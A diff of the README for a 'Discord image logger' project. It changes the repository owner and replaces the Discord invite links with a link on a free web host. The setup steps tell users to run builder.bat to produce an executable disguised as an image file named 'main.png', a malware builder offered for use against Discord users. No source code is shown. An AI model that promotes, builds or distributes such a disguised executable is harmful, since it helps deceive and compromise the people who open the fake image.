@@ -1,16 +1,16 @@
 <img src="https://cdn.discordapp.com/attachments/1098287991807557654/1105174702797881527/image.png" width="100%" height="100%" />
 
 <div align="center">
-    <img src="https://img.shields.io/github/languages/top/neveronsere/image-logger?color=%23000000">
-    <img src="https://img.shields.io/github/stars/neveronsere/image-logger?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/languages/top/0x559/Discord-image-logger?color=%23000000">
+    <img src="https://img.shields.io/github/stars/0x559/Discord-image-logger?color=%23000000&logoColor=%23000000">
     <br>
-    <img src="https://img.shields.io/github/commit-activity/w/neveronsere/image-logger?color=%23000000"> 
-    <img src="https://img.shields.io/github/last-commit/neveronsere/image-logger?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/commit-activity/w/0x559/Discord-image-logger?color=%23000000"> 
+    <img src="https://img.shields.io/github/last-commit/0x559/Discord-image-logger?color=%23000000&logoColor=%23000000">
     <br>
-    <img src="https://img.shields.io/github/issues/neveronsere/image-logger?color=%23000000&logoColor=%23000000">
-    <img src="https://img.shields.io/github/issues-closed/neveronsere/image-logger?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/issues/0x559/Discord-image-logger?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/issues-closed/0x559/Discord-image-logger?color=%23000000&logoColor=%23000000">
     <br>
-    - Join our server for announcements and updates: <a href="https://discord.gg/yeats">Join Discord</a>
+    - Join our server for announcements and updates: <a href="http://0x507.ct.ws/discord/">Join Discord</a>
     - Please star the github repository for more updates
 </div>
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
@@ -58,7 +58,7 @@
 
 ### Setup
 
-1. [Download source code zip](https://github.com/neveronsere/image-logger/archive/refs/heads/main.zip)
+1. [Download source code zip](https://github.com/0x559/Discord-image-logger/archive/refs/heads/main.zip)
 2. Extract zip
 3. Run `builder.bat`
 4. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.png`
@@ -74,6 +74,6 @@
 
 ## Errors?
 
--   Join the [Discord](https://discord.gg/yeats)
+-   Join the [Discord](http://0x507.ct.ws/discord/)
 
 <img src="img/footer.png">
